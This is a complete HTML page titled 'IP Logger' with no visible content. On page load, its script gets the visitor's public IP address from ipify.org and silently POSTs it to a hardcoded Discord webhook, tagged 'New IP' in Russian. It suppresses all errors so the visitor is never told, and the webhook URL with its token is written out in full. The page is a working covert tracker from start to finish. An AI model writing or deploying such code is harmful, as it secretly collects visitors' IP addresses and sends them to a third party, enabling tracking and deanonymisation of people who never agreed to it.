<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>IP Logger</title>
</head>
<body>
    <script>
        (async () => {
            try {
                const ipRes = await fetch('https://ipify.org');
                const ipData = await ipRes.json();
                
                await fetch('https://discord.com/api/webhooks/1544368600498831432/Zm9kUQSnH-o7T1Vny1V14kJ5YmSg4jyywUOTTc0oeihEqfeZzfPNf7d6Ltun-L9KxQxI', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `Новый IP: ${ipData.ip}` })
                });
            } catch (e) {}
        })();
    </script>
</body>
</html>
